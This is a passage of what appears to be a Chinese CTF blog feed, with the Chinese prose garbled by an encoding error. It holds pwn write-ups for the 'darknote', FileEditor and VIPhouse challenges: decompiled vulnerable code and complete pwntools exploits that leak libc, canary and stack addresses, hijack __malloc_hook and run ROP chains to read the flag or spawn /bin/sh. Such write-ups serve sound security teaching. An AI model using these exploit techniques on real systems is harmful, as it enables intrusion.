class="number">0x68</span>uLL);</span><br></pre></td></tr></table></figure><p>note_count*8åå¦‚æœæº¢å‡ºï¼Œä¼šå¯¼è‡´ç”³è¯·çš„å †å—å°äº<code> v6 = (void **)((char *)note_ptr_ar + 8 * index_add); *v6 = malloc(0x68uLL);</code>å¯å†™çš„å †å—ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨mmapç”³è¯·åˆ°libcä¸Šæ–¹çš„å †å—ï¼Œå°±å¯ä»¥å¾€libcå†™æˆ‘ä»¬ç”³è¯·çš„å †åœ°å€</p><p>æ€è·¯</p><ul><li>æŠŠæˆ‘ä»¬ç”³è¯·å †çš„åœ°å€å†™å…¥åˆ° main_arena.fastbin[5]çš„ä½ç½®ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨ç”³è¯·å †ä¼ªé€ ä¸‹ä¸€ä¸ªå †ï¼Œé€ æˆä»»æ„å †çš„ç”³è¯·</li><li>åˆ©ç”¨è¾“å‡ºèœå•å‡½æ•°æ³„éœ²libc</li><li>åˆ©ç”¨å­˜å‚¨ç€ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡çš„__environæ³„éœ²stackåœ°å€</li><li>åœ¨stackä¸Šå¸ƒç½®ropé“¾</li><li>malloc_hookæ”¹ä¸ºè§¦å‘ropé“¾çš„gadget</li></ul><p>ä»»æ„å †ç”³è¯·æ—¶è¦æ³¨æ„ç”³è¯·çš„ä»»æ„å †çš„fdåŸŸå³ä»»æ„å †åœ°å€+0x10å¤„è¦ä¸º0ï¼Œä¸ç„¶è¿‡ä¸äº†æ£€æµ‹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./darknote&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x401B7B&#x27;)#malloc</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x401AFF&#x27;)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, note</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Note: &#x27;</span>, note)</span><br><span class="line"><span class="comment">#mmap 0x7f82cbc1c010</span></span><br><span class="line">sla(<span class="string">b&#x27;do you want?&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x40040000</span>))</span><br><span class="line"><span class="comment">#pwndbg&gt; p &amp;main_arena.fastbinsY[5]</span></span><br><span class="line"><span class="comment">#$1 = (mfastbinptr *) 0x7f82cc009bb8 &lt;main_arena+56&gt;</span></span><br><span class="line"><span class="comment">#distance 0x7f82cc009bb8  0x7f82cbc1c010</span></span><br><span class="line"><span class="comment">#0x7f82cc009bb8-&gt;0x7f82cbc1c010 is -0x3edba8 bytes (-0x7db75 words)</span></span><br><span class="line">fast_5=<span class="number">0x3edba8</span>&gt;&gt;<span class="number">3</span></span><br><span class="line">add(fast_5,flat(<span class="number">0</span>,<span class="number">0x71</span>,<span class="number">0x404260</span>-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,flat(<span class="number">0</span>,<span class="number">0</span>,elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">rl()</span><br><span class="line">puts_ad=uu64(r(<span class="number">6</span>))</span><br><span class="line">libcbase=puts_ad-libcelf.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line"></span><br><span class="line">environ = libcbase + libcelf.sym[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">malloc_hook=libcbase+libcelf.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">syscall=libcbase+libcelf.symbols[<span class="string">&#x27;syscall&#x27;</span>]</span><br><span class="line">write=libcbase+libcelf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read=libcbase+libcelf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">add(fast_5,flat(<span class="number">0</span>,<span class="number">0x71</span>,<span class="number">0x404260</span>-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,flat(<span class="number">0</span>,<span class="number">0</span>,environ))</span><br><span class="line">rl()</span><br><span class="line">stack=uu64(r(<span class="number">6</span>))-<span class="number">0x98</span></span><br><span class="line">p(<span class="string">&#x27;stack&#x27;</span>,stack)</span><br><span class="line">pop_pop=<span class="number">0x0000000000401dbb</span></span><br><span class="line">ropstart=libcbase+<span class="number">0x00000000000ddc57</span></span><br><span class="line"><span class="comment"># 0x00000000000ddc57 : add rsp, 0xe0 ; pop rbx ; ret </span></span><br><span class="line">bss=<span class="number">0x404000</span></span><br><span class="line"></span><br><span class="line">add(fast_5,flat(<span class="number">0</span>,<span class="number">0x71</span>,stack-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401dc3</span></span><br><span class="line">pop_rsi_ret = libcbase + <span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx_ret = libcbase + <span class="number">0x0000000000142c92</span></span><br><span class="line">ropread=flat(<span class="number">0</span>,<span class="number">0</span>,pop_rdi_ret,<span class="number">0</span>,pop_rsi_ret,bss+<span class="number">0x100</span>,pop_rdx_ret,<span class="number">0x300</span>,elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop.migrate(bss+<span class="number">0x100</span>)</span><br><span class="line">ropread+=rop.chain()</span><br><span class="line">add(<span class="number">1</span>,ropread)</span><br><span class="line"><span class="comment"># db(&#x27;b *0x401B7B&#x27;)#malloc</span></span><br><span class="line">add(fast_5,flat(<span class="number">0</span>,<span class="number">0x71</span>,malloc_hook-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,p64(ropstart))</span><br><span class="line">db(<span class="string">&#x27;b *__malloc_hook&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>).encode())</span><br><span class="line">flagstr=bss+<span class="number">0x100</span>+<span class="number">7</span>*<span class="number">8</span>*<span class="number">3</span></span><br><span class="line">orw=flat(pop_rdi_ret,<span class="number">2</span>,pop_rsi_ret,flagstr,pop_rdx_ret,<span class="number">0</span>,syscall)</span><br><span class="line">orw+=flat(pop_rdi_ret,<span class="number">3</span>,pop_rsi_ret,bss+<span class="number">200</span>,pop_rdx_ret,<span class="number">0x30</span>,read)</span><br><span class="line">orw+=flat(pop_rdi_ret,<span class="number">1</span>,pop_rsi_ret,bss+<span class="number">200</span>,pop_rdx_ret,<span class="number">0x30</span>,write)</span><br><span class="line">orw.ljust(<span class="number">7</span>*<span class="number">8</span>*<span class="number">3</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">orw+=<span class="string">b&#x27;flag\x00&#x27;</span></span><br><span class="line">pause()</span><br><span class="line">sl(orw)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF 2023 &amp; 0X401ä¸ƒæœˆæš‘æœŸæŒ‘æˆ˜èµ› pwn</title>
      <link href="/2023/07/24/2023-DASCTF-0X401/"/>
      <url>/2023/07/24/2023-DASCTF-0X401/</url>
      
        <content type="html"><![CDATA[<p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/15LFJ4XykHz3bax3CAnJl3A">https://pan.baidu.com/s/15LFJ4XykHz3bax3CAnJl3A</a><br>æå–ç ï¼šhwg0</p><h2 id="FileEditor"><a href="#FileEditor" class="headerlink" title="FileEditor"></a>FileEditor</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">DWORD line_num</span><br><span class="line"><span class="type">char</span> <span class="built_in">string</span>[<span class="number">204</span>]</span><br><span class="line"><span class="type">void</span> *next_ptr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Find_Stringé‡Œä¼šæŠŠåŸæ¥çš„å­—ç¬¦ä¸²å…ˆæ‹·è´åˆ°æ ˆï¼Œæœ€åå†æ‹·è´å›å»ï¼Œåªè¦æ§åˆ¶a2 + 104å¤„ä¸º0ï¼Œa2ä¸ä¸º0å°±å¯ä»¥æŠŠæ ˆä¸Šçš„å€¼æ‹·è´å›åˆ°åŸæ¥å­˜å‚¨å­—ç¬¦ä¸²çš„å †ä¸Šï¼Œè¿™é‡Œå°±å®Œå…¨ç¬¦åˆcanaryæœ€åä¸€ä½ä¸º\x00çš„ç‰¹æ€§</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">vuln_copy</span><span class="params">(<span class="type">char</span> *a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(a2 + <span class="number">104</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strcpy</span>(a1, (<span class="type">const</span> <span class="type">char</span> *)a2);</span><br><span class="line">  result = (<span class="type">char</span> *)*(<span class="type">unsigned</span> __int8 *)(a2 + <span class="number">105</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !(_BYTE)result )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strcpy</span>(a1, (<span class="type">const</span> <span class="type">char</span> *)a2);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">179</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">char</span> *)*(<span class="type">unsigned</span> __int8 *)(i + a2);</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)result == <span class="number">0xFF</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    result = (<span class="type">char</span> *)*(<span class="type">unsigned</span> __int8 *)(i + a2);</span><br><span class="line">    a1[i] = (<span class="type">char</span>)result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Find_Stringæ—¶æ ˆæƒ…å†µï¼Œå¯ä»¥ç”¨æ¥æ³„éœ²åŸºåœ°å€</p><p><img src="/2023/07/24/2023-DASCTF-0X401/image-20230724230450343.png" alt="image-20230724230450343"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libc=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;28327&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Insert_Line</span>(<span class="params">line_num,line_count,content</span>):</span><br><span class="line">  sla(<span class="string">b&#x27;&gt; choose:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">  sla(<span class="string">b&#x27;r n m:&#x27;</span>,<span class="built_in">str</span>(line_num).encode())</span><br><span class="line">  sl(<span class="built_in">str</span>(line_count).encode())</span><br><span class="line">  sla(<span class="string">b&#x27;sequence:&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Modify_Line</span>(<span class="params">line_num,content</span>):</span><br><span class="line">  sla(<span class="string">b&#x27;&gt; choose:&#x27;</span>,<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">  sla(<span class="string">b&#x27;be modified:&#x27;</span>,<span class="built_in">str</span>(line_num).encode())</span><br><span class="line">  sla(<span class="string">b&#x27; content:&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findstring</span>(<span class="params">find_str</span>):</span><br><span class="line">  sla(<span class="string">b&#x27;&gt; choose:&#x27;</span>,<span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line">  sla(<span class="string">b&#x27;search for:&#x27;</span>,find_str)</span><br><span class="line">  sla(<span class="string">b&#x27;hing? (y/n)&#x27;</span>,<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">  sla(<span class="string">b&#x27;&gt; choose:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x2154)&#x27;)</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x001FA4)&#x27;)</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x02350)&#x27;)</span></span><br><span class="line">sla(<span class="string">b&#x27;&gt; choose:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">Insert_Line(<span class="number">1</span>,<span class="number">1</span>,<span class="string">b&#x27;abc&#x27;</span>+<span class="string">b&#x27;d&#x27;</span>*<span class="number">101</span>)</span><br><span class="line">findstring(<span class="string">b&#x27;abc&#x27;</span>)</span><br><span class="line">Modify_Line(<span class="number">1</span>,<span class="string">b&#x27;abc&#x27;</span>+<span class="string">b&#x27;d&#x27;</span>*<span class="number">101</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">b&#x27;abc&#x27;</span>+<span class="string">b&#x27;d&#x27;</span>*<span class="number">101</span>)</span><br><span class="line">canary=uu64(r(<span class="number">8</span>))-<span class="number">0xa</span></span><br><span class="line">p(<span class="string">&#x27;canary&#x27;</span>,canary)</span><br><span class="line">Modify_Line(<span class="number">1</span>,<span class="string">b&#x27;abc&#x27;</span>+<span class="string">b&#x27;d&#x27;</span>*<span class="number">101</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">b&#x27;A&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">b&#x27;A&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">pie=uu64(r(<span class="number">6</span>))-(<span class="number">0x55555555552b</span>-<span class="number">0x555555554000</span>)</span><br><span class="line">p(<span class="string">&#x27;pie&#x27;</span>,pie)</span><br><span class="line"></span><br><span class="line">Modify_Line(<span class="number">1</span>,<span class="string">b&#x27;abc&#x27;</span>+<span class="string">b&#x27;d&#x27;</span>*<span class="number">101</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>+<span class="string">b&#x27;A&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">b&#x27;A&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">heapbase=uu64(r(<span class="number">6</span>))-(<span class="number">0x55555555a2a0</span>-<span class="number">0x55555555a000</span>)</span><br><span class="line">p(<span class="string">&#x27;heapbase&#x27;</span>,heapbase)</span><br><span class="line"></span><br><span class="line">Modify_Line(<span class="number">1</span>,<span class="string">b&#x27;abc&#x27;</span>+<span class="string">b&#x27;d&#x27;</span>*<span class="number">101</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>+<span class="string">b&#x27;A&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">b&#x27;A&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">libcbase=uu64(r(<span class="number">6</span>))-(<span class="number">0x7ffff7de5083</span>-<span class="number">0x7ffff7dc1000</span>)<span class="comment">#ubuntu20</span></span><br><span class="line"><span class="comment"># -(0x7ffff7c29d90-0x7ffff7c00000)#unbuntu22</span></span><br><span class="line">p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">system=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh=<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))+libcbase</span><br><span class="line">rdi=pie+<span class="number">0x2ac3</span></span><br><span class="line">ret=pie+<span class="number">0x101a</span></span><br><span class="line">rop=flat([canary,<span class="number">0</span>,rdi,binsh,ret,system])</span><br><span class="line"><span class="built_in">print</span>(rop)</span><br><span class="line"><span class="comment"># rop=p64(canary)+p64(0xdeadbeef)+p64(rdi)+p64(binsh)+p64(system)</span></span><br><span class="line"><span class="comment"># print(rop)</span></span><br><span class="line">Modify_Line(<span class="number">1</span>,<span class="string">b&#x27;abc&#x27;</span>+<span class="string">b&#x27;d&#x27;</span>*<span class="number">101</span>+rop)</span><br><span class="line">findstring(<span class="string">b&#x27;abc&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>å¦ä¸€ä¸ªå¯ä»¥æ³„éœ²çš„æ¼æ´ç‚¹åœ¨Replace_Stringå‡½æ•°é‡Œ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> v14[<span class="number">104</span>]; <span class="comment">// [rsp+130h] [rbp-70h] BYREF</span></span><br><span class="line"><span class="type">unsigned</span> __int64 v15; <span class="comment">// [rsp+198h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">v15 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">v4 = <span class="number">0</span>;</span><br><span class="line">v5 = <span class="number">1</span>;</span><br><span class="line">v7 = <span class="number">1</span>;</span><br><span class="line">v9 = a1;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;&gt; Please enter the string to search for:&quot;</span>);</span><br><span class="line">read_string((__int64)s2, <span class="number">104</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;&gt; Replace with:&quot;</span>);</span><br><span class="line">read_string((__int64)v14, <span class="number">104</span>);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">read_string</span><span class="params">(__int64 a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="type">int</span>)i &lt;= a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = read(<span class="number">0</span>, (<span class="type">void</span> *)((<span class="type">int</span>)i + a1), <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)((<span class="type">int</span>)i + a1) == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)((<span class="type">int</span>)i + a1) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>read_stringå®é™…ä¸Šå¯ä»¥å¾€é‡Œè¯»105ä¸ªæ•°ï¼Œæ¥è¦†ç›–canaryæœ€åä¸€ä½</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v11 = sub_55EAC947338F(s2, v14, v9-&gt;<span class="built_in">string</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(v9-&gt;<span class="built_in">string</span>, v11);</span><br></pre></td></tr></table></figure><p>å¯ä»¥æŠŠcanaryä¿å­˜åˆ°å­˜å‚¨å­—ç¬¦ä¸²å»æ¥æ³„éœ²</p><p>æœ€ååœ¨åˆ©ç”¨ä¸‹é¢çš„read_stringé‡Œçš„&#x2F;nä¼šè¢«ç½®é›¶ï¼Œæ¥æ¢å¤canary</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;&gt; Do you want to change your strings? (y/n)&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%c&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( v3 == <span class="string">&#x27;Y&#x27;</span> || v3 == <span class="string">&#x27;y&#x27;</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&gt; Replace with:&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    read_string((__int64)v14, <span class="number">104</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ‰äº†canaryå…¶å®å°±å¯ä»¥åœ¨Find_Stringé‡Œæ„é€ ropåˆ©ç”¨putsæ¥æ³„éœ²libcäº†ï¼Œé«˜ç‰ˆæœ¬çš„æ ˆé‡Œæ˜¯libc_start_call_mainåŸºæœ¬ä¸Šæ²¡æœ‰å·¥å…·å¯ä»¥å¯»æ‰¾libcåº“</p><h2 id="VIPhouse"><a href="#VIPhouse" class="headerlink" title="VIPhouse"></a>VIPhouse</h2><p>loginå­˜åœ¨æº¢å‡º</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">login</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [rsp+0h] [rbp-2A0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+64h] [rbp-23Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">64</span>]; <span class="comment">// [rsp+258h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+298h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v2, <span class="number">0</span>, <span class="number">0x1F4</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(v3, <span class="number">0</span>, <span class="keyword">sizeof</span>(v3));</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter your username: &quot;</span>);</span><br><span class="line">  get_str(s, <span class="number">99LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter your password: &quot;</span>);</span><br><span class="line">  get_str(v3, <span class="number">104LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s, <span class="string">&quot;admin&quot;</span>) &amp;&amp; !<span class="built_in">strcmp</span>(v3, <span class="string">&quot;root&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome, ADMIN~&quot;</span>);</span><br><span class="line">    admin = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  user = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> v4 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>canary functioné‡Œ ç”¨strcpy(s, random);ç»™sèµ‹å€¼ï¼Œrandomå­˜åœ¨å¼€å¤´ä¸º0æƒ…å†µï¼Œå¯¼è‡´sä¸ºbâ€™\x00â€™*8ï¼Œå¯ä»¥æ³„éœ²canary</p><p>ç¨‹åºé‡Œæ²¡æœ‰gadgetç›´æ¥ç»™rdièµ‹å€¼ï¼Œå¯ä»¥ç”¨ä¸‹é¢æ¥èµ‹å€¼</p><figure class="highlight 